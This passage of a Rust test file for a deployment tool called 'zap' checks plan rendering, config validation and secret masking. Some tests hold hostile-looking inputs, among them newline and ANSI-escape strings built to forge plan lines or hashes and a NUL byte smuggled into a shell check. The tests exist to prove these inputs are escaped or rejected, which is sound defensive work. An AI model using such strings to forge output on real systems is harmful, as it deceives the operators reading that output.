        ),
    ];
    for (confirmation, banner) in banners {
        for (reason, why) in &reasons {
            // set apart from the plan above it by a blank line
            assert_eq!(
                rendered(reason, confirmation),
                format!("\n  {banner}\n    {why}\n"),
                "{confirmation:?} {reason:?}"
            );
        }
    }
    // An accepted confirmation clears the refusal, so no report renders one under it.
    assert_eq!(
        rendered(&reasons[1].0, Some(Confirmation::Accepted)),
        rendered(&reasons[1].0, None)
    );
    assert_eq!(
        rendered(
            &PlanUnreviewed::Changed {
                reviewed: "abc\nplan_hash: 0".to_owned(),
                command: RunCommand::ApplyRefused,
                ran_at: "now\u{1b}[2K".to_owned(),
            },
            None
        ),
        "\n  REFUSED — nothing ran: this plan was not reviewed.\n    the last preview (zap \
         apply --wetrun, refused before it ran at now<U+001B>[2K) planned \
         abc<U+000A>plan_hash: 0; the config, the target, or the user the run connects as \
         changed since.\n"
    );
}

/// The `LOCK` banner of the comparing commands, word for word; a command that
/// compares nothing under it says what follows in its own clause.
#[test]
fn the_lock_banner_reads_the_same_for_the_comparing_commands() {
    use super::{LOCK_WITHHELD_FROM_COMPARISON, render_lock_standing};
    use crate::lock::LockStanding;

    let standing = LockStanding {
        missing: vec!["a".to_owned()],
        stale: vec!["b".to_owned()],
        ..LockStanding::default()
    };
    let mut out = String::new();
    render_lock_standing(&mut out, &standing, LOCK_WITHHELD_FROM_COMPARISON);
    assert_eq!(
        out,
        "  LOCK — the pin ledger does not answer for 2 resource(s), so they are withheld \
         from the comparison below:\n      a — no pin yet; run `zap update a`\n      b — \
         stale: the config changed since the pin was minted; run `zap update b`\n"
    );
    let mut out = String::new();
    render_lock_standing(&mut out, &standing, "so nothing checks them");
    assert!(
        out.starts_with(
            "  LOCK — the pin ledger does not answer for 2 resource(s), so nothing checks \
             them:\n"
        ),
        "{out}"
    );
    let mut out = String::new();
    render_lock_standing(&mut out, &LockStanding::default(), "unused");
    assert_eq!(out, "");
}

#[test]
fn structure_gate_passes_a_clean_config() {
    let config = config(&serde_json::json!([
        {"id": "d", "type": "directory", "path": "/srv"},
        {"id": "svc", "type": "service", "service": "x", "enabled": true, "depends_on": ["d"]},
    ]));
    assert!(validate_config_structure(&config).is_ok());
}

#[test]
fn structure_gate_rejects_service_intent_without_a_manager() {
    // A `service` on a target that declares no `service_manager` has no honest verb
    // to plan — a gate error, not a guessed `systemctl`.
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"local": true},
        "resources": [{"id": "svc", "type": "service", "service": "x", "enabled": true}],
    }))
    .unwrap();
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config for an undeclared service manager");
    };
    assert!(
        message.contains("declares no `service_manager`"),
        "{message}"
    );
    assert!(message.contains("service `svc`"), "{message}");
}

/// A NUL in a string a shell would run fails the gate with the field named, before
/// anything touches a target — a shell would drop it and run a different command.
#[test]
fn structure_gate_rejects_a_nul_in_a_command() {
    let config = config(&serde_json::json!([
        {"id": "ready", "type": "script", "check": "test -d /e\u{0}tc", "run": "true"},
    ]));
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config for a NUL in a check");
    };
    assert!(
        message.contains("resource `ready`: `check` contains a NUL byte"),
        "{message}"
    );
}

#[test]
fn structure_gate_aggregates_every_problem() {
    // a dangling depends_on and a cycle, reported together as one `Error::Config`
    // instead of a silent empty "converged" plan and exit 0.
    let config = config(&serde_json::json!([
        {"id": "a", "type": "directory", "path": "/a", "depends_on": ["b"]},
        {"id": "b", "type": "directory", "path": "/b", "depends_on": ["a"]},
        {"id": "c", "type": "directory", "path": "/c", "depends_on": ["ghost"]},
    ]));
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    assert!(
        message.contains("depends_on unknown resource `ghost`"),
        "{message}"
    );
    assert!(message.contains("dependency cycle"), "{message}");
}

#[test]
fn structure_gate_rejects_a_cycle_through_a_trigger() {
    // `conf` depends on the service it triggers: the service runs after its trigger
    // source, so neither can go first.
    let config = config(&serde_json::json!([
        {"id": "conf", "type": "file", "path": "/etc/web.conf",
         "content": {"type": "inline", "content": "x"},
         "triggers": ["web"], "depends_on": ["web"]},
        {"id": "web", "type": "service", "service": "web", "enabled": true},
    ]));
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config for a trigger cycle");
    };
    assert!(
        message.contains("dependency cycle: conf, web (the edges are `depends_on`"),
        "{message}"
    );
}

/// The shared env gate names every unresolved reference. Hermetic: it reads the
/// process env, and a `ZAP_TEST_*` name no one sets stays unset.
#[test]
fn env_gate_reports_unresolved_references() {
    let config = config(&serde_json::json!([
        {"id": "d", "type": "directory",
         "path": Text::of_pieces([Lit("/etc/"), Ref("ZAP_TEST_UNSET_ALPHA")])},
    ]));
    let message = unresolved_env_message(&config).expect("an unset reference must be reported");
    assert!(message.contains("ZAP_TEST_UNSET_ALPHA"), "{message}");
    assert!(message.contains("--env-file"), "{message}");
}

/// No references, nothing to report — the gate stays silent rather than warning on
/// every config.
#[test]
fn env_gate_is_silent_for_a_reference_free_config() {
    let config = config(&serde_json::json!([
        {"id": "d", "type": "directory", "path": "/srv"},
    ]));
    assert_eq!(unresolved_env_message(&config), None);
}

#[test]
fn structure_gate_rejects_duplicate_ids() {
    let config = config(&serde_json::json!([
        {"id": "a", "type": "directory", "path": "/a"},
        {"id": "a", "type": "directory", "path": "/a2"},
    ]));
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    assert!(message.contains("duplicate resource ids: a"), "{message}");
}

/// The gate's findings are a list under one error, one line each: config text in a
/// finding — an id holding a newline — can't add an item to it.
#[test]
fn a_structural_finding_is_one_line_of_the_error() {
    let config = config(&serde_json::json!([
        {"id": "a", "type": "directory", "path": "/a",
         "depends_on": ["ghost\n  - resource `b` is fine\u{1b}[1A"]},
        {"id": "a", "type": "directory", "path": "/a2"},
    ]));
    let Err(Error::Config(message)) = validate_config_structure(&config) else {
        panic!("expected a structural Error::Config");
    };
    assert_eq!(
        message,
        "config has 2 structural error(s):\n  - duplicate resource ids: a\n  - resource \
         `a`: `depends_on[0]` (`ghost<U+000A>  - resource `b` is fine<U+001B>[1A`) is not \
         a name zap can use for a resource: write a letter, a digit or `_`, then letters, \
         digits, or any of `_ . + : @ -` (e.g. `nginx`, `app-env`, `postgresql@16`)"
    );
}

/// The findings a wetrun stops on are escaped where the message is composed, so
/// each stays on its own line of it; the variables it finds unset are named by name
/// alone — a variable's name holds nothing to escape, and none of the text around
/// its reference comes with it.
#[test]
fn the_composed_messages_escape_their_parts() {
    assert_eq!(
        super::unrunnable_message(&["`a`: bad\n  `b`: forged".to_owned(), "`c`: bad".to_owned()]),
        "2 change(s) can't be run, so nothing was changed:\n  `a`: bad<U+000A>  `b`: \
         forged\n  `c`: bad"
    );
    let config = config(&serde_json::json!([
        {"id": "d", "type": "directory", "path": Text::of_pieces([
            Lit("/etc/\nforged: 0"), Ref("ZAP_TEST_UNSET_FORGED"), Lit("\nforged: 1"),
        ])},
    ]));
    let message = unresolved_env_message(&config).unwrap();
    assert!(
        message.starts_with(
            "1 environment variable(s) referenced by the config are unset or empty: \
             ZAP_TEST_UNSET_FORGED\n  provide them"
        ),
        "{message}"
    );
    let mut out = String::new();
    super::render_unverifiable(&mut out, &["A\rB".to_owned(), "C".to_owned()]);
    assert!(out.contains(":\n      A<U+000D>B, C\n"), "{out}");
}

/// A resource id is config text too: one holding a newline can't add a change line
/// to a plan, or a held line to the verdict under it.
#[test]
fn a_resource_id_cannot_forge_a_line() {
    use super::{render_change, render_undetermined};
    use zap_types::plan::{Change, ChangeAction, PlanStep};
    use zap_types::schema::ResourceId;

    let id = "go  (script)\n  [-] data";
    let mut out = String::new();
    render_change(
        &mut out,
        &Change {
            resource_id: ResourceId(id.to_owned()),
            action: ChangeAction::Create,
            steps: vec![PlanStep::Run("true".to_owned())],
            desired: serde_json::from_value(serde_json::json!({
                "id": id, "type": "script", "check": "false", "run": "true",
            }))
            .unwrap(),
            depends_on: vec![],
            trigger: None,
        },
    );
    assert_eq!(
        out,
        "  [+] go  (script)<U+000A>  [-] data  (script)\n      check: false\n      > true\n"
    );

    let mut out = String::new();
    render_undetermined(
        &mut out,
        &[HeldResource {
            resource_id: ResourceId("fw — read\n      data".to_owned()),
            trigger: None,
            cause: HoldCause::Undetermined {
                reason: "unread".to_owned(),
            },
        }],
    );
    assert!(
        out.contains("      fw — read<U+000A>      data — unread\n"),
        "{out}"
    );
}

/// The comparing commands lead their render with the `LOCK` banner in its
/// comparison wording — pinned at each call site, since the clause is the caller's.
#[test]
fn plan_and_detect_lead_with_the_comparison_lock_banner() {
    use super::detect::DetectReport;
    use super::plan::PlanReport;
    use super::{render_detect, render_plan, render_plan_diff};
    use crate::lock::LockStanding;
    use zap_types::plan::Plan;

    const BANNER: &str = "  LOCK — the pin ledger does not answer for 1 resource(s), so they \
                          are withheld from the comparison below:\n      a — no pin yet; run \
                          `zap update a`\n";
    let standing = LockStanding {
        missing: vec!["a".to_owned()],
        ..LockStanding::default()
    };
    let plan = PlanReport {
        target: "local".to_owned(),
        plan: Plan {
            references: std::collections::BTreeMap::new(),
            changes: Vec::new(),
            target: serde_json::from_value(serde_json::json!({"local": true})).unwrap(),
            machine: local_machine(),
        },
        plan_hash: super::PlanAddress::Hash("deadbeef".to_owned()),
        unrecorded: None,
        warnings: Vec::new(),
        detected: std::collections::BTreeMap::new(),
        unverifiable: Vec::new(),
        held: Vec::new(),
        lock_standing: standing.clone(),
    };
    assert!(
        render_plan(&plan).starts_with(BANNER),
        "{}",
        render_plan(&plan)
    );
    assert!(
        render_plan_diff(&plan).starts_with(BANNER),
        "{}",
        render_plan_diff(&plan)
    );
    let detect = DetectReport {
        target: "local".to_owned(),
        package_manager: None,
        service_manager: None,
        resources: Vec::new(),
        unverifiable: Vec::new(),
        lock_standing: standing,
        unrecorded: None,
    };
    assert!(
        render_detect(&detect).starts_with(BANNER),
        "{}",
        render_detect(&detect)
    );
}

/// `detect` exits 1 for each answer that isn't established — an unverifiable
/// comparison, an undetermined resource, a lock standing with errors — and 0 when every
/// line is a verdict, whatever the verdicts are.
#[test]
fn detect_exits_1_for_each_unestablished_answer_and_0_otherwise() {
    use super::detect::{DetectLine, DetectReport};
    use crate::lock::LockStanding;
    use zap_types::detected::Detection;
    use zap_types::schema::{ResourceId, ResourceType};

    let line = |detection: Detection| DetectLine {
        resource_id: ResourceId("r".to_owned()),
        detection,
        kind: ResourceType::Directory,
    };
    let report = |resources: Vec<DetectLine>| DetectReport {
        target: "local".to_owned(),
        package_manager: None,
        service_manager: None,
        resources,
        unverifiable: Vec::new(),
        lock_standing: LockStanding::default(),
        unrecorded: None,
    };
    assert_eq!(
        report(vec![line(Detection::Converged), line(Detection::Absent)]).exit_code(),
        0
    );
    let undetermined = report(vec![
        line(Detection::Converged),
        line(Detection::Undetermined {
            reason: "probe failed".to_owned(),
        }),
    ]);
    assert_eq!(undetermined.exit_code(), 1);
    let mut unverifiable = report(vec![line(Detection::Converged)]);
    unverifiable.unverifiable = vec!["DEPLOY_HOST".to_owned()];
    assert_eq!(unverifiable.exit_code(), 1);
    let mut unlocked = report(vec![line(Detection::Converged)]);
    unlocked.lock_standing.missing = vec!["zig".to_owned()];
    assert_eq!(unlocked.exit_code(), 1);
    let mut orphaned = report(vec![line(Detection::Converged)]);
    orphaned.lock_standing.orphans = vec!["gone".to_owned()];
    assert_eq!(orphaned.exit_code(), 0);
}

/// The connection and the plan name the same machine: for each selection, the user and
/// host `build_ssh` connects with are the ones `resolve_machine` puts in the plan.
#[test]
fn the_connection_and_the_plan_name_the_same_machine() {
    let _env = crate::resolve::test_env::set(&[
        ("ZAP_T_MACHINE_HOST", "a.example.com"),
        ("ZAP_T_MACHINE_USER", "deploy"),
    ]);
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {
            "host": Text::reference("ZAP_T_MACHINE_HOST"),
            "user": Text::reference("ZAP_T_MACHINE_USER"),
            "bootstrap_user": "root",
        },
        "resources": [],
    }))
    .unwrap();
    for (bootstrap, user) in [(false, "deploy"), (true, "root")] {
        let ssh = build_ssh(&config.target, bootstrap).unwrap();
        let machine = super::resolve_machine(&config, no_secrets(), bootstrap)
            .unwrap()
            .machine;
        assert_eq!(ssh.user, user);
        assert_eq!(machine.user(), Some(ssh.user.as_str()));
        assert_eq!(machine.host(), ssh.host);
    }
}

/// A reference's value is one line of the block whatever it holds: an escape
/// sequence, a line break and a line that reads as a change or a hash are written
/// out, a long value is cut with its length and digest, and a value that reads like
/// a state still follows `NAME = `.
#[test]
fn a_hostile_reference_value_stays_one_escaped_line() {
    use zap_types::plan::ReferenceValue;
    use zap_types::scalar::EnvVarName;

    let value = |text: String| ReferenceValue::Value(text);
    let references: std::collections::BTreeMap<EnvVarName, ReferenceValue> = [
        (
            "A",
            value("\u{1b}[31m\n  [+] forged  (script)\nplan_hash: 00\r".to_owned()),
        ),
        (
            "B",
            value(format!(
                "{}\u{1b}tail",
                "x".repeat(super::REFERENCE_VALUE_SHOWN)
            )),
        ),
        ("C", value("is a secret: its value is not shown".to_owned())),
    ]
    .into_iter()
    .map(|(name, value)| (EnvVarName::new(name).unwrap(), value))
    .collect();
    let mut out = String::new();
    super::render_references(&mut out, &references);
    let lines: Vec<&str> = out.lines().collect();
    assert_eq!(lines.len(), 4, "{out}");
    assert_eq!(lines[0], "  references:");
    assert_eq!(
        lines[1],
        "    A = <U+001B>[31m<U+000A>  [+] forged  (script)<U+000A>plan_hash: 00<U+000D>"
    );
    assert!(!out.contains('\u{1b}') && !out.contains('\r'), "{out:?}");
    assert!(
        lines[2].starts_with(&format!(
            "    B = {} … (+5 more character(s); the whole value's blake3 begins ",
            "x".repeat(super::REFERENCE_VALUE_SHOWN)
        )),
        "{}",
        lines[2]
    );
    assert_eq!(lines[3], "    C = is a secret: its value is not shown");
}

/// What `plan --diff` shows of the target is masked like everything else zap prints:
/// a link pointing into a path named for a secret shows the secret's token, not its
/// value.
#[tokio::test]
async fn plan_diff_masks_the_observed_side() {
    use crate::commands::plan::{plan_over, render_plan_diff};
    use crate::secret::build_validated_masker;
    use zap_types::detected::{CurrentState, Detection};
    use zap_types::observe::{PathFacet, PathObservation, Privilege, Query};
    use zap_types::schema::ResourceId;

    const SECRET: &str = "s3cretvalue123";
    let _env = crate::resolve::test_env::set(&[("ZAP_T_APP_SECRET", SECRET)]);
    let config: ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"local": true, "service_manager": "systemd"},
        "resources": [
            {"id": "s", "type": "script", "check": "true", "run": "true",
             "env": {"APP_SECRET": {"$env": "ZAP_T_APP_SECRET"}}},
            {"id": "l", "type": "link", "path": "/srv/current", "target": "/srv/other"},
        ],
    }))
    .unwrap();
    let masker = build_validated_masker(&config, crate::resolve::env_var).unwrap();
    let read = Query::Path {
        path: "/srv/current".to_owned(),
        facet: PathFacet::LinkTarget,
        privilege: Privilege::Login,
    };
    let conn = Connection::Mock(MockConnection::new("mock").with_observation(
        read,
        Observation::Path(PathObservation::LinkTarget(
            format!("/srv/{SECRET}").into_bytes(),
        )),
    ));
    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let report = plan_over(
        &conn,
        &config,
        PassContext {
            zap_home: Some(home.path()),
            config_path: &config_path,
            masker: &masker,
            bootstrap: false,
        },
    )
    .await
    .unwrap();

    assert_eq!(
        report.detected.get(&ResourceId("l".to_owned())),
        Some(&Detection::Drifted {
            current: CurrentState::Link {
                points_to: "/srv/[MASKED:ZAP_T_APP_SECRET]".to_owned(),
            },
        })
    );
    let rendered = render_plan_diff(&report);
    assert!(!rendered.contains(SECRET), "{rendered}");
    assert!(
        rendered.contains("/srv/[MASKED:ZAP_T_APP_SECRET] → /srv/other"),
        "{rendered}"
    );
}
